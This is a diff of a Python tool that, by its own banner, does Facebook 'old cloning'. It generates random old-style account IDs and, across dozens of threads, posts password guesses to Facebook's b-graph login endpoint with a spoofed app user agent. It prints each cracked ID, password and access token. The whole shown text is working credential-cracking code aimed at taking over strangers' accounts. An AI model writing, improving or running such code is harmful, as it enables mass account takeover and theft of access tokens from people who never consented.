@@ -5635,31 +5635,11 @@ xdx = f"{white}[{green}?{white}]"
 #---------------------[ CLEAR ]---------------------#
 def clear():
     os.system('clear')
-    print(logo)
 
 
 def linex():
     print(f"{white}{47*'-'}")
 
-
-#---------------------[ LOGO ]---------------------#
-logo = f'''\n      {cyan}
-
-   ###    ########  ##    ##    ###    ##    ## 
-  ## ##   ##     ##  ##  ##    ## ##   ###   ## 
- ##   ##  ##     ##   ####    ##   ##  ####  ## 
-##     ## ########     ##    ##     ## ## ## ## 
-######### ##   ##      ##    ######### ##  #### 
-##     ## ##    ##     ##    ##     ## ##   ### 
-##     ## ##     ##    ##    ##     ## ##    ##  •XD
-                                        
-{C}─────────────────────────────────────────────
-{C}| {G}OWNER   {W}: ARYAN ✅  {W}ARNOLD HARDY
-{C}| {G}GITHUB  {W}: aryan
-{C}| {G}VERSION {W}: 1.0
-{C}| {G}TOOLS   {W}: FACEBOOK OLD CLONING
-{C}| {G}STATUS  {W}: PERSONAL
-{C}─────────────────────────────────────────────'''
 
 
 #---------------------[ MAIN MENU ]---------------------#
@@ -5683,9 +5663,9 @@ def _____OLD_____():
     limit = int(input(f'{xdx} ENTER CRACK LIMIT : '))
     ___pot___ = "10000"
     for ixx in range(int(limit)):
-        khalifa = str(random.choice(range(1000000000, 1999999999)))
+        khalifa = str(random.choice(range(3000000000, 3999999999)))
         user.append(khalifa)
-    with ThreadPool(max_workers=60) as ____iloveyou____:
+    with ThreadPool(max_workers=40) as ____iloveyou____:
         clear()
         tl = str(len(user))
         print(f'{xd} TOTAL CRACK LIMIT :{green} {tl} ')
@@ -5712,7 +5692,7 @@ def _____method_____(ids, passlist):
     sys.stdout.write(f'\r\r\033[1;37m[ARYAN-XD] %s|\033[1;32mOK:-%s ' %
                      (loop, len(oks)))
     sys.stdout.flush()
-    _____mrpoco_____ = random.choice(ugen)
+    _____mrpoco_____ = "Mozilla/5.0 (Linux; Android 9; G8343 Build/47.2.A.10.107; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.111 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/229.1.0.17.118;]"
     try:
         for pas in passlist:
             data = {
@@ -5798,14 +5778,10 @@ def _____method_____(ids, passlist):
             url = "https://b-graph.facebook.com/auth/login"
             response = requests.post(url, data=data, headers=head,
                                      verify=True).json()
+            
+            print(ids)
             if "access_token" in response:
-                print('\r\r\033[1;32m[ARYAN-XD-OK] ' + ids + ' | ' + pas +
-                      '\033[1;97m')
-                with open("res.txt", "a", encoding="utf-8") as f:
-                    f.write(f"{ids}|{pas}" + "\n")
-                with open("res2.txt", "a", encoding="utf-8") as f:
-                    f.write(f"{ids}|{pas}|{response}" + "\n")
-                oks.append(ids)
+                print(f"{ids}|{pas}|{response}")
                 break
             elif "www.facebook.com" in response.get("error",
                                                     {}).get("message", ""):
